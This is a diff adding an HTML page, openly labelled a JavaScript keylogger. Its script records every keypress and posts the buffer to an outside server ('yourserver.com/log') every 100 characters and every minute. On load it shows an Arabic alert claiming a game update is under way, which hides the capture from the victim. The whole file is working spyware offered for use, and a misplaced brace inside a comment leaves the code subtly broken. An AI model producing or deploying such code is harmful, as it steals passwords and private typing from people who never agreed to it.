@@ -1,0 +1,21 @@
+## JavaScript Keylogger in Webpage Start ##
+<html>
+<body onload="startLogging()">
+<script>
+function sendData(data) {
+    var xhr = new XMLHttpRequest();
+    xhr.open("POST","https://yourserver.com/log", true);
+    xhr.setRequestHeader("Content-Type","application/json");
+    xhr.send(JSON.stringify({keylogs: data}));}
+var logs = "";
+document.onkeypress = function(e) {
+    logs += e.key +"";    if (logs.length > 100) {
+        sendData(logs);
+        logs = "";}};
+
+function startLogging() {
+    alert("جاري تحديث اللعبة، انتظر قليلاً...");
+    setInterval(function() { sendData(logs);}, 60000); // بيبعت كل دقيقة}</script>
+</body>
+</html>
+## JavaScript Keylogger in Webpage End ##
